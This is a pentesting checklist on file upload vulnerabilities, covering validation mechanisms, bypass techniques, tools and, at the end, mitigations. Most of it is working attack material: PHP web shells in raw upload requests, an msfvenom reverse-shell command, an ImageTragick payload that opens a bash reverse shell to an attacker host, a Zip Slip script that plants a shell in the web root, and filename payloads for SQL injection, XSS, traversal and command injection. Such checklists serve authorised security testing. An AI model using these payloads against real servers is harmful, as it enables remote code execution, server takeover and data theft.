# File Upload Vulnerability Checklist

## 1. Introduction to File Upload Vulnerabilities

File upload vulnerabilities are critical flaws in web applications that allow an attacker to upload malicious files. If exploited, these can lead to severe consequences, including **remote code execution (RCE)**, server compromise, data exposure, and more. While essential for modern web applications, insecure implementations pose significant risks.

### 1.1. Where to Find File Upload Functionality:

File upload features are commonly found in:

* User profile picture uploads
* Document submission forms
* Attachment functionalities in messaging or support systems
* Content management systems (CMS)
* Any feature allowing users to submit files to the server

### 1.2. Potential Impacts of Exploiting File Upload Vulnerabilities:

* **Remote Code Execution (RCE):** Execute arbitrary code on the server.
* **Server-Side Request Forgery (SSRF):** Force the server to make requests to internal or external resources.
* **Cross-Site Scripting (XSS):** Inject malicious scripts into web pages viewed by other users.
* **Local File Inclusion (LFI):** Include local files, potentially exposing sensitive data.
* **XML External Entity (XXE) Injection:** Process malicious XML input to access local files or perform network requests.
* **Phishing:** Host phishing pages on the compromised server.
* **Parameter Pollution:** Manipulate parameters to alter application logic.
* **Information Disclosure:** Inadvertently expose internal server paths or configurations.
* **SQL Injection:** (Rarely) specific file handling might lead to SQL injection.
* **Denial of Service (DoS):** Overload the server with large or malformed files.

### 1.3. Impact of Common File Extensions if Successfully Uploaded:

This table outlines common file extensions and the typical vulnerabilities they can lead to if successfully uploaded and processed by the server.

| Extensions                                                                      | Potential Impact                              |
| :------------------------------------------------------------------------------ | :-------------------------------------------- |
| `.asp`, `.aspx`, `.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phtm`, `.phps`, `.pht`, `.shtml`, `.phar`, `.pgif`, `.inc` | Webshell, Remote Code Execution (RCE)         |
| `.config`                                                                       | RCE (e.g., `web.config` for IIS)              |
| `.cer`, `.asa`                                                                  | RCE (IIS <= 7.5)                              |
| `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.actions`             | JSP execution (RCE)                           |
| `.pl`, `.pm`, `.cgi`, `.lib`                                                    | Perl execution (RCE)                          |
| `.cfm`, `.cfml`, `.cfc`, `.dbm`                                                 | ColdFusion execution (RCE)                  |
| `.js`, `.json`, `.node`                                                         | Node.js execution (RCE), Configuration Manipulation |
| `.yaws`                                                                         | Erlang Yaws Web Server execution (RCE)        |
| `.svg`                                                                          | Stored XSS, SSRF, XXE                         |
| `.gif`                                                                          | Stored XSS, SSRF                              |
| `.csv`                                                                          | CSV Injection                                 |
| `.xml`                                                                          | XXE                                           |
| `.avi`                                                                          | LFI, SSRF                                     |
| `.html`, `.htm`                                                                 | HTML Injection, XSS, Open Redirect            |
| `.png`, `.jpeg`, `.jpg`                                                         | Pixel Flood Attack (DoS)                      |
| `.zip`                                                                          | RCE via LFI, DoS (Zip Slip)                   |
| `.pdf`, `.pptx`                                                                 | SSRF, Blind XXE                               |
| `.scf`                                                                          | RCE (Windows Shell Command File)              |
| `.htaccess`                                                                     | RCE, server configuration manipulation        |
| `shell.aspx;1.jpg`                                                              | IIS < 7.0 bypass for ASPX execution           |
| `shell.soap`                                                                    | ASP.NET Web Services exploitation             |

---

## 2. Types of File Upload Validation Mechanisms

Web applications employ various validation mechanisms to prevent malicious file uploads. Understanding these defenses is crucial for devising effective bypass strategies.

1.  **Client-Side Validation:**
    * **Mechanism:** Performed in the user's web browser using JavaScript, VBScript, or HTML5 attributes *before* the file is sent to the server. Primarily for user experience (quick feedback).
    * **Bypass Principle:** Client-side validation is easily circumvented as it can be disabled or bypassed by manipulating the HTTP request directly.

2.  **File Name / Extension Validation:**
    * **Mechanism:** The server checks the file's extension to determine if it's allowed.
        * **Blacklisting:** Rejects a specific list of known dangerous extensions (e.g., `.php`, `.exe`).
        * **Whitelisting:** Only permits a small, predefined set of safe extensions (e.g., `.jpg`, `.png`).
    * **Bypass Principle:** Relies on tricking the server's parsing logic or exploiting inconsistencies in how it interprets filenames, often through special characters, encoding, or unexpected file formats.

3.  **Content-Type / MIME-type Validation:**
    * **Mechanism:** The server inspects the `Content-Type` header in the HTTP request (e.g., `Content-Type: image/png`).
    * **Bypass Principle:** The `Content-Type` header is user-controlled and can be easily manipulated in the HTTP request, even if the actual file content does not match.

4.  **Content-Length Validation:**
    * **Mechanism:** The server checks the size of the uploaded file against a defined maximum limit.
    * **Bypass Principle:** Focus on using minimal payloads that fit within the size limit, or exploiting scenarios where checks are performed prematurely or on an initial, smaller portion of the file.

5.  **File Content / Image Header Validation (Magic Bytes):**
    * **Mechanism:** The server reads the initial bytes (magic bytes) of the file to verify its true file type, often using server-side functions (e.g., `getimagesize()` in PHP). If the magic bytes don't match the expected type, the upload is rejected.
    * **Bypass Principle:** Involves prepending legitimate magic bytes to malicious code, embedding code in file metadata, or crafting polyglot files that are valid for multiple formats.

---

## 3. Comprehensive File Upload Testing and Exploitation Methodology

This section outlines a systematic approach to identifying and exploiting file upload vulnerabilities, combining initial testing with advanced bypass techniques.

### 3.1. Initial Reconnaissance and Basic Tests

1.  **Identify Upload Functionality:** Browse the application thoroughly and locate all file upload features.
2.  **Basic Web Shell Upload Attempt:**
    * As a first step, attempt to upload a simple web shell (e.g., a basic PHP, ASP, or JSP shell) with its standard, dangerous extension.
    * **Tools:** Use `weevely` (`weevely generate <password> <path>`) or `msfvenom` (`msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`).
    * **Request Example:**
        ```http
        POST /images/upload/ HTTP/1.1
        Host: target.com
        Content-Length: [Calculated_Length]
        Content-Type: multipart/form-data; boundary=---------------------------BoundaryString

        ---------------------------BoundaryString
        Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
        Content-Type: application/x-php

        <?php system($_GET['cmd']); ?>
        ---------------------------BoundaryString--
        ```
3.  **Analyze Server Responses:** Carefully observe HTTP status codes, error messages, and any redirects. This provides crucial clues about the validation mechanisms in place.

### 3.2. Advanced Bypass Techniques

If initial attempts fail, systematically apply the following bypass techniques, often in combination.

#### 3.2.1. Filename & Extension Manipulation Bypasses

These techniques target the server's handling and parsing of the file's name and extension.

* **Double Extensions:**
    * **Concept:** Some servers validate only the last extension or the first, ignoring others.
    * **Payloads:** `file.php.jpg`, `file.jpg.php`, `file.php.blah123jpg`
    * **Note:** `file.php.jpg` is particularly useful for Apache misconfigurations where anything with `.php` (even if not the last extension) might execute.

* **Null Byte Injection (`%00` or `\x00`):**
    * **Concept:** The null byte terminates a string in many programming languages (like C/C++). If the server-side validation uses a function that stops reading the filename at a null byte (e.g., `pathinfo()`), it might only see the safe part of the filename, while the actual file written to disk retains the malicious extension.
    * **Payloads:** `file.php%00.gif`, `file.php\x00.gif`, `file.php%00.png`, `file.php\x00.png`, `file.php%00.jpg`, `file.php\x00.jpg`
    * **How to use:** In Burp Repeater, you can often type `%00` directly, or for `\x00`, you might need to go to the hex editor and change a character's hex value (e.g., change `D`'s hex value `44` to `00` in `file.phpD.jpg`).

* **URL Encoding / Special Characters:**
    * **Concept:** Exploits how the server or filesystem interprets special characters or URL encodings in filenames.
    * **Payloads:**
        * **Multiple dots:** `file.php......` (Windows removes trailing dots).
        * **Whitespace and Newline:** `file.php%20` (trailing space), `file.php%0d%0a.jpg` (CRLF injection), `file.php%0a` (newline).
        * **Right-to-Left Override (RTLO):** `name.%E2%80%AEphp.jpg` (displays as `name.gpj.php` on systems supporting RTLO, tricking users).
        * **Slashes:** `file.php/` (trailing slash for Linux/Unix), `file.php.\` (trailing backslash for Windows), `file.j\sp`, `file.j/sp`.
        * **Multiple Slashes:** `file.jsp/././././.` (exploits path normalization issues).
        * **Hash Character:** `file.php#.png` (the hash character might be treated as a comment by some parsers, ignoring subsequent characters).
        * **Missing Dot:** `file.` (might be parsed as `file.php` if server logic is flawed).

* **Unpopular/Obscure Extensions:**
    * **Concept:** Blacklisting often misses less common executable extensions. Whitelisting might be too broad or contain oversights.
    * **Extensions to try:**
        * **PHP:** `.pht`, `.phps`, `.phar`, `.phpt`, `.pgif`, `.phtml`, `.phtm`, `.inc`
        * **ASP:** `.cer`, `.asa`, `shell.soap`
        * **JSP:** `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.actions`
        * **Perl:** `.pl`, `.pm`, `.cgi`, `.lib`
        * **ColdFusion:** `.cfm`, `.cfml`, `.cfc`, `.dbm`
        * **Node.js:** `.js`, `.json`, `.node`
        * **Erlang Yaws:** `.yaws`

* **Case Manipulation:**
    * **Concept:** Exploits case-sensitive filesystem but case-insensitive validation logic.
    * **Payloads:** `.pHp`, `.pHP5`, `.PhAr`

* **Filename Length Limits:**
    * **Concept:** If the server truncates filenames after a certain length, you can craft a filename where the legitimate extension is cut off, leaving the malicious one.
    * **Example (Linux max 255 bytes, target `.php`):**
        ```bash
        # Create a filename that is 255 - length_of_safe_extension (e.g., .png = 4) = 251 bytes long, ending with .php
        # Then, append .png to bypass initial checks.
        python -c 'print("A" * 247 + ".php.png")'
        # If server truncates at 251 bytes, it will save as "A...A.php"
        ```

* **Burp Intruder for Extension Fuzzing:**
    * **Concept:** Automate testing a large list of extensions to identify which ones are accepted.
    * **Tool Usage:** Use Burp Intruder with a comprehensive extension wordlist (e.g., from SecLists).

#### 3.2.2. Content-Based Bypasses

These techniques manipulate the file's `Content-Type` header or its actual binary content.

1.  **Content-Type Validation Bypass:**
    * **Concept:** The `Content-Type` header is user-controlled. Even if the file's actual content is a web shell, changing this header to an allowed MIME type (e.g., an image type) can bypass server-side checks that only look at the header.
    * **Payload:** Upload your malicious file (e.g., `dapos.php`) but modify the `Content-Type` header.
    * **Request Example:**
        ```http
        POST /images/upload/ HTTP/1.1
        Host: target.com
        Content-Length: [Calculated_Length]
        Content-Type: multipart/form-data; boundary=---------------------------BoundaryString

        ---------------------------BoundaryString
        Content-Disposition: form-data; name="uploadedfile"; filename="dapos.php"
        Content-Type: image/jpeg  <-- Changed content-type from application/x-php
        [PHP Shell Code Here]
        ---------------------------BoundaryString--
        ```
    * **Common MIME Types:** `image/png`, `image/gif`, `image/jpeg`, `text/plain`, `application/octet-stream`.
    * **Wordlist:** [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt).
    * **Set Content-Type Twice:** Some parsers might process the first instance. Try setting an unallowed `Content-Type` followed by an allowed one.

2.  **Content-Length Validation Bypass:**
    * **Concept:** If the server checks file size, use very small shell payloads that fit within the limit.
    * **Small PHP Shell Examples:**
        * ``<?=`$_GET[x]`?>`` (executes command from `x` GET parameter)
        * ``<?=‘ls’;`` (lists directory contents)
    * **Note:** `<?` requires `short_open_tag=On` in `php.ini`.
    * **Execution:** If successful, access the uploaded file (e.g., `http://example.com/uploads/dapos.php?x=cat%20%2Fetc%2Fpasswd`).

3.  **Magic Bytes / Image Header Validation Bypass:**
    * **Concept:** The server inspects the initial bytes (magic bytes) of the file. By prepending legitimate magic bytes of an allowed file type to your malicious code, you can trick the server into believing it's a valid file, while the rest contains your shell.
    * **Payload:** Add the magic bytes for a valid image before your shell code.
    * **Request Example (GIF):**
        ```http
        POST /images/upload/ HTTP/1.1
        Host: target.com
        Content-Length: [Calculated_Length]
        Content-Type: multipart/form-data; boundary=---------------------------BoundaryString

        ---------------------------BoundaryString
        Content-Disposition: form-data; name="uploadedfile"; filename="dapos.php"
        Content-Type: image/gif  <-- Changed content-type
        GIF89a; <?php system($_GET['cmd']); ?>
        ---------------------------BoundaryString--
        ```
    * **More Magic Bytes:** Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).
    * **Metadata Shell:** Embed the shell into the metadata (e.g., EXIF data) of a seemingly valid image file (`.jpg`, `.png`).
        * **Tool:** Use `exiftool`: `exiftool -Comment="<?php echo "<pre>"; system($_GET['cmd']); ?>" img.jpg`
        * Upload the modified `img.jpg`. If the server processes metadata and the file is then executable, it's a win.
    * **Picture Compression Vulnerabilities:** Craft valid pictures hosting executable code that can be triggered by file inclusion or other means.
        * **JPG:** Use `createBulletproofJPG.py` from [https://virtualabs.fr/Nasty-bulletproof-Jpegs-l](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l).
        * **PNG:** Use `createPNGwithPLTE.php` from [https://blog.isec.pl/injection-points-in-popular-image-formats/](https://blog.isec.pl/injection-points-in-popular-image-formats/).
        * **GIF:** Use `createGIFwithGlobalColorTable.php` from [https://blog.isec.pl/injection-points-in-popular-image-formats/](https://blog.isec.pl/injection-points-in-popular-image-formats/).

#### 3.2.3. Server-Specific & Advanced Bypasses

These techniques exploit specific server configurations, functionalities, or vulnerabilities in third-party libraries.

1.  **Configuration File Uploads:**
    * **Concept:** Overwriting or uploading specific configuration files can alter server behavior, allowing execution of otherwise non-executable files.
    * **Apache (`.htaccess`):**
        * Upload a `.htaccess` file that instructs Apache to execute certain file types (e.g., `.png`) as PHP.
        * **Example `.htaccess` content:** `AddType application/x-httpd-php .png`
        * Then, upload your PHP shell with a `.png` extension (e.g., `shell.png`).
        * **Resource:** [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
    * **IIS/.NET (`web.config`):**
        * Upload a malicious `web.config` file.
        * **Resource:** [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config), [https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
    * **uWSGI (`uwsgi.ini`):**
        ```ini
        [uwsgi]
        ; read from a symbol
        foo = @(sym://uwsgi_funny_function)
        ; read from binary appended data
        bar = @(data://[REDACTED])
        ; read from http
        test = @(http://[REDACTED])
        ; read from a file descriptor
        content = @(fd://[REDACTED])
        ; read from a process stdout
        body = @(exec://whoami)
        ; call a function returning a char *
        characters = @(call://uwsgi_func)
        ```
    * **Other Configuration Files:** Look for `httpd.conf` (Busybox), `__init__.py` (Python).
    * **Dependency Manager Configuration Files:** Overwrite `package.json` (Node.js) or `composer.json` (PHP) to inject malicious scripts that execute during build or dependency installation.
        * **`package.json` example:**
            ```json
            "scripts": {
                "prepare" : "/bin/touch /tmp/pwned.txt"
            }
            ```
        * **`composer.json` example:**
            ```json
            "scripts": {
                "pre-command-run" : [
                "/bin/touch /tmp/pwned.txt"
                ]
            }
            ```

2.  **Archive-Based Attacks (Zip Slip):**
    * **Concept:** If the application allows `.zip` file uploads and automatically extracts them, a Zip Slip vulnerability can occur. This allows an attacker to use directory traversal (`../`) within the archive to write a file to an arbitrary location outside the intended upload directory.
    * **Tools/Payloads:**
        * **`evilarc` tool:** `python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15`
        * **Python script to create malicious zip:**
            ```python
            #!/usr/bin/python
            import zipfile
            from io import BytesIO

            def create_zip():
                f = BytesIO()
                z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
                z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
                z.writestr('otherfile.xml', 'Content of the file')
                z.close()
                zip = open('poc.zip','wb')
                zip.write(f.getvalue())
                zip.close()

            create_zip()
            ```
        * **Symbolic Links in Zips:** `ln -s ../../../index.php symindex.txt; zip --symlinks test.zip symindex.txt`
        * **Manual File Spraying with Directory Traversal:**
            1.  Create a simple PHP shell.
            2.  Create multiple copies of the shell with filenames like `xxAcmd.php`, `xxAxxAcmd.php`, etc.
            3.  Zip all these files.
            4.  Open the `.zip` in a hex editor or `vi` and globally replace `xxA` with `../`.
            5.  Upload the modified `.zip`. If decompressed, the shell might land in the web root.
    * **Resource:** [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip)

3.  **Image Processing Vulnerabilities (e.g., ImageMagick, FFmpeg):**
    * **Concept:** If the server uses image/video processing libraries, known vulnerabilities in these libraries can be exploited by uploading specially crafted files.
    * **ImageMagick (ImageTragick - CVE-2016-3714 and others):**
        * **Payload Example:** Upload this content with an image extension.
            ```bash
            push graphic-context
            viewbox 0 0 640 480
            fill 'url([https://127.0.0.1/test.jpg](https://127.0.0.1/test.jpg)"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
            pop graphic-context
            ```
        * **Gifoeb Tool:** Use `gifoeb` to generate malicious GIF files that can leak memory or execute commands.
            * `git clone https://github.com/neex/gifoeb`
            * `./gifoeb gen 512x512 dump.gif` (Try `.jpg`, `.png`, `.bmp`, `.tiff`, `.tif` extensions as well).
            * Upload `dump.gif`. Download any returned "pixel files" and use `./gifoeb recover <file> | strings` to extract potential outputs.
        * **Resources:** [https://hackerone.com/reports/302885](https://hackerone.com/reports/302885), [https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e](https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e)
    * **FFmpeg HLS Vulnerability:** Check for known vulnerabilities in FFmpeg if it's used for video processing.

4.  **Server-Specific File Upload Vulnerabilities:**
    * **Jetty RCE:** If the server is Jetty, try uploading a malicious XML file to `$JETTY_BASE/webapps/`.
        * **Example:** [JettyShell.xml - From Mikhail Klyuchnikov](https://raw.githubusercontent.com/Mike-n1/tips/main/JettyShell.xml)

5.  **Filename-Based Injection Vulnerabilities (Post-Upload Handling):**
    * **Concept:** The vulnerability isn't in the upload itself, but how the filename is processed *after* being stored (e.g., used in database queries, displayed in UI, or passed to system commands).
    * **Time-Based SQLi Payloads:**
        ```html
        poc.js'(select*from(select(sleep(20)))a)+'.extension
        ```
    * **LFI/Path Traversal Payloads:**
        ```html
        image.png../../../../../../../etc/passwd
        ```
    * **XSS Payloads:**
        ```html
        '"><img src=x onerror=alert(document.domain)>.extension
        <img src=x onerror=alert('XSS')>.png
        "><img src=x onerror=alert('XSS')>.png
        "><svg onmouseover=alert(1)>.svg
        <<script>alert('xss')a.png
        ```
    * **File Traversal:**
        ```html
        ../../../tmp/lol.png
        ```
    * **Command Injection:**
        ```html
        ; sleep 10;
        ```

6.  **SSRF via Wget/Curl Truncation Trick:**
    * **Concept:** In scenarios where a server uses `wget` or `curl` to download files from a user-controlled URL, and it performs extension validation on the *original* URL. `wget` (on Linux) truncates filenames to 236 characters.
    * **Bypass Strategy:** Create a file on your server with a filename like "A" \* 232 + ".php" + ".gif". The server's validation will see `.gif` (allowed), but `wget` will truncate it to "A" \* 232 + ".php", potentially leading to an executable file being downloaded.
    * **Setup Example:**
        1.  Create the malicious file on your HTTP server:
            ```bash
            echo "<?php system($_GET['cmd']); ?>" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
            ```
        2.  Start a simple HTTP server: `python3 -m http.server 9080`
        3.  Provide the long URL to the vulnerable application.
    * **Note:** This won't work if `wget` is used with `--trust-server-names` and the HTTP server redirects to a different file, as `wget` will then use the redirected filename.

### 3.3. Other Useful Payloads to Upload

* **HTML/SVG files:** To trigger an XSS.
* **EICAR file:** To check the presence and effectiveness of an antivirus.
    * `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

---

## 4. General Testing Tips & Workflow

1.  **Always Intercept:** Use a proxy (like Burp Suite) to intercept and modify file upload requests. This is fundamental for bypassing client-side checks and manipulating headers/content.
2.  **Combine Techniques:** Don't limit yourself to one bypass method. Often, a combination of techniques (e.g., changing Content-Type AND using a double extension) is required for success.
3.  **Client-Side vs. Server-Side:** Never trust client-side validation. Always bypass client-side checks and send the modified request directly to the server.
4.  **Observe Responses:** Analyze server responses carefully. Even generic error messages (e.g., 500 Internal Server Error) can sometimes indicate a partial bypass or a different vulnerability.
5.  **Check for Hidden Functionality:** Look for undocumented API endpoints or hidden features related to file uploads that might have weaker controls.
6.  **Read and Learn:** Continuously research new bypass techniques and vulnerability chains.
7.  **Top 10 File Upload Vulnerability Achievables (from Salah Hasoneh):**
    1.  **ASP / ASPX / PHP5 / PHP / PHP3:** Webshell / RCE
    2.  **SVG:** Stored XSS / SSRF / XXE
    3.  **GIF:** Stored XSS / SSRF
    4.  **CSV:** CSV injection
    5.  **XML:** XXE
    6.  **AVI:** LFI / SSRF
    7.  **HTML / JS:** HTML injection / XSS / Open redirect
    8.  **PNG / JPEG:** Pixel flood attack (DoS)
    9.  **ZIP:** RCE via LFI / DoS
    10. **PDF / PPTX:** SSRF / BLIND XXE

---

## 5. Recommended Tools for File Upload Testing

* **Fuxploider:** [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider) - An automated tool for testing file upload vulnerabilities.
* **Burp Suite Extensions:**
    * **Upload Scanner:** [https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) ([github-portswigger](https://github.com/portswigger/upload-scanner)) - Helps identify and test file upload vulnerabilities.
* **OWASP ZAP AddOns:**
    * **FileUpload AddOn:** [https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) - An official ZAP add-on for file upload testing.
* **Exiftool:** For viewing and manipulating image metadata.
* **Weevely / Msfvenom:** For generating various types of web shells.
* **Gifoeb:** Specifically for ImageMagick GIF vulnerabilities.
* **Evilarc:** For creating malicious ZIP files for Zip Slip.

---

## 6. Mitigation Strategies for Secure File Uploads

Implementing secure file upload functionality requires a multi-layered approach to minimize risk:

* **Use Server-Generated Filenames:** Store uploaded files with randomly generated, unique filenames. This prevents path traversal, overwriting existing files, and guessing file locations.
* **Whitelist Accepted File Types:**
    * **Strictly enforce a whitelist of allowed file extensions.** Only permit extensions explicitly required and known to be safe by the application.
    * **Inspect actual file content (magic bytes)** to verify the true file type, not just relying on the user-controlled `Content-Type` header.
    * **Blacklist common executable formats** as a defense-in-depth measure, but rely primarily on whitelisting.
* **Validate File Size:** Enforce strict size limits on uploaded files. Implement this validation both at the application level and, if possible, at the web server configuration level (e.g., Nginx, Apache) to prevent DoS attacks.
* **Sanitize Filenames:** Remove or sanitize any potentially malicious characters (`..`, `/`, `\`, null bytes, special characters, control characters) from filenames before storage.
* **Store Files Outside Web Root:** Store uploaded files in a dedicated, non-executable directory outside the web server's document root. If this is not possible, ensure the directory has appropriate permissions (e.g., no execute permissions) and is secured with `.htaccess` or `web.config` to prevent execution.
* **Scan Uploaded Files:** Integrate with anti-virus or malware scanning solutions to detect malicious content.
* **Handle Downloads Securely:**
    * When serving uploaded files for download, provide accurate, non-generic `Content-Type` headers.
    * Include the `X-Content-Type-Options: nosniff` header to prevent browsers from MIME-sniffing and potentially executing unintended content.
    * Use `Content-Disposition: attachment; filename="downloaded_file.ext"` to force downloads rather than in-browser execution.
* **Reject Archive Formats:** Unless absolutely necessary, reject common archive formats like `.zip`, `.tar`, `.rar` to prevent Zip Slip attacks. If archives are required, implement secure extraction procedures and validate extracted content.
* **Principle of Least Privilege:** Ensure the user account under which the web server runs has only the necessary permissions to handle file uploads.
* **Monitor and Log:** Implement robust logging for all file upload attempts and anomalies.
* **Content Delivery Network (CDN) with Security Features:** Consider using a CDN that offers features like malware scanning and content filtering for uploaded files.
* **Regular Security Audits:** Conduct periodic security audits and penetration tests on file upload functionalities.